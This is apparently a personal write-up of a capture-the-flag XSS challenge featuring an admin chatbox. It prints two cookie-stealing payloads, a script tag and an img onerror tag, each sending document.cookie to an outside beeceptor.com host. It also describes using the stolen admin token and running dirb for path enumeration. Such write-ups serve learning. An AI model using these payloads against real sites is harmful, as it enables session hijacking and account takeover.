This challenge is clearly another xss challenge as its in the webpage link we get.<br />
We see a page with a moving image and a chatbox with an admin.

I tried the same xss as in the Government Agriculture Network challenge:<br />
\<script\>location.href="https://paulovh.free.beeceptor.com?"+ document.cookie\</script\>

This returns:<br />
HACKER ALERT!

So there is some checking for xss going on.
This can get very tricky as i found out last year however the first thing I checked already worked out:<br />
Using an img tag with an onerror that executes javascript is another very common way to inject javascript and this does work:<br />
\<img src=X onerror='location.href="https://paulovh.free.beeceptor.com?"+ document.cookie'/\>

This gave me the flag on the beeceptor mock api page!

When trying to go to /admin of the page you get redirected back to the main page.<br />
I tried this /admin page as it is a common page on many sites but for a more reliable way of getting these kind of pages you can use:<br />
dirb https://cwo-xss.web.ctfcompetition.com<br />
the dirb program will go trough a wordlist of common website paths and test them all and return you which ones worked.

The xss also gives you an auth token from the admin.
Adding this in my firefox storage (explained in my Government Agriculture Network write-up) and going again to the /admin page I now get a new page with 3 options:
- Users
- Livestreams
- Camera Controls

The first 2 do nothing, the last one gives the message:<br />
Requests only accepted from 127.0.0.1

Here I got stuck. I did not know for sure there was a flag to find here but it did seem like there was something here.

I eventualy needed to read a write-up to find this flag :( There is some magic happening with parameters in the url that make the page think you are comming from 127.0.0.1<br />
I dont know how I should have found this. I will be looking for write-ups that give a better explanation than the first I found and add a better explanation here if I do.

This part I abandoned after I had failed myself in the crypto challenge. Maybe more googleing would make it clear even without finding other write-ups but at this point I had had enough for now.

